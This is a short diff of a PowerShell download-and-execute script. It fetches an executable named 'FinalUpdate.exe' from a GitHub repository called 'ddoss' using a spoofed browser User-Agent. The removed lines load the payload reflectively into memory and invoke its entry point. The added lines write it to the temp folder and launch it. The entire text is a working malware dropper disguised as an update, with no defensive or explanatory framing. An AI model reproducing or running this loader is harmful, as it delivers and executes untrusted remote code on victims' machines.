@@ -1,12 +1,6 @@
 $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
+$p = "$env:temp\FinalUpdate.exe"
 $w = New-Object Net.WebClient
 $w.Headers.Add("User-Agent", "Mozilla/5.0")
-$d = $w.DownloadData($u)
-$a = [System.Reflection.Assembly]::Load($d)
-$m = $a.EntryPoint
-$p = $m.GetParameters()
-if ($p.Count -eq 0) {
-    $m.Invoke($null, $null)
-} else {
-    $m.Invoke($null, @(,[string[]]@()))
-}
+$w.DownloadFile($u, $p)
+Start-Process $p
